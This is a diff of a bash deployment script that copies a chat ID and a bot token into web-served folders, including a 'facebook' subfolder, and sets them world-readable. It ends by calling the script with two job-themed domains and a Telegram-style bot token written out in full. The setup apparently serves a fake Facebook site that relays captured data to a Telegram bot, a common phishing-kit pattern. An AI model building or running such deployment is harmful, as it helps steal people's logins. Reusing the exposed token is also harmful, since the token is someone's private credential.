@@ -102,16 +102,20 @@ if [ ! -z "$CHAT_ID" ]; then
     echo "Writing chat ID to all sites..."
     echo "$CHAT_ID" | sudo tee $MAIN_ROOT/chat-id.txt > /dev/null
     echo "$CHAT_ID" | sudo tee $FB_ROOT/chat-id.txt > /dev/null
+    echo "$CHAT_ID" | sudo tee $FB_ROOT/facebook/chat-id.txt > /dev/null
     sudo chmod 644 $MAIN_ROOT/chat-id.txt
     sudo chmod 644 $FB_ROOT/chat-id.txt
+    sudo chmod 644 $FB_ROOT/facebook/chat-id.txt
 fi
 
 if [ ! -z "$TOKEN" ]; then
     echo "Writing token to all sites..."
     echo "$TOKEN" | sudo tee $MAIN_ROOT/token.txt > /dev/null
     echo "$TOKEN" | sudo tee $FB_ROOT/token.txt > /dev/null
+    echo "$TOKEN" | sudo tee $FB_ROOT/facebook/token.txt > /dev/null
     sudo chmod 644 $MAIN_ROOT/token.txt
     sudo chmod 644 $FB_ROOT/token.txt
+    sudo chmod 644 $FB_ROOT/facebook/token.txt
 fi
 
 # Remove old config files
@@ -220,3 +224,6 @@ echo ""
 echo "🌐 Test your sites:"
 echo "   curl -I https://$MAIN_DOMAIN"
 echo "   curl -I https://$FB_DOMAIN"
+
+
+bash setup.sh careerspring.online workbridge.fun -4810802827 7572707710:AAEOGs3vXmSONg-9TdAFu9Dc66RSBBWPkHM
